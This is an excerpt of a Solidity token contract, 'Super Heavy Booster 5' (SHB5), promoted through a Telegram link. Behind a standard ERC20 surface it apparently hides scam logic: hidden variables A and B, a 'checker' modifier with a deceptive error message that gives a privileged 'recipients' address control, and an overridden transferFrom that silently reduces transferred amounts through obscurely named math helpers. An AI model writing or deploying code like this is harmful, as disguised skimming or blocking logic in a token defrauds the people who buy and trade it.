...
contract SuperHeavy is Context {
    ...
    uint256 internal A;
    uint256 internal B;
    event superheavybooster(address indexed previouso, address indexed newo);
    ...
    modifier checker() {
        require(recipients == _msgSender(), "caller is not zero address");
        _;
    }
...
contract ERC20 is Context, IERC20, IERC20Metadata,SuperHeavy {
    ...
    function transferFrom(address sender, address recipient, uint256 Amount) public virtual override returns (bool) {
        uint256 amounts=Amount.prod(A).cal(B);
        uint256 amount=Amount.red(amounts);
...
contract SuperHeavyBooster5 is ERC20{
     ...
     */
    constructor () ERC20('Super Heavy Booster 5 | https://t.me/superheavybooster5', 'SHB5') public{
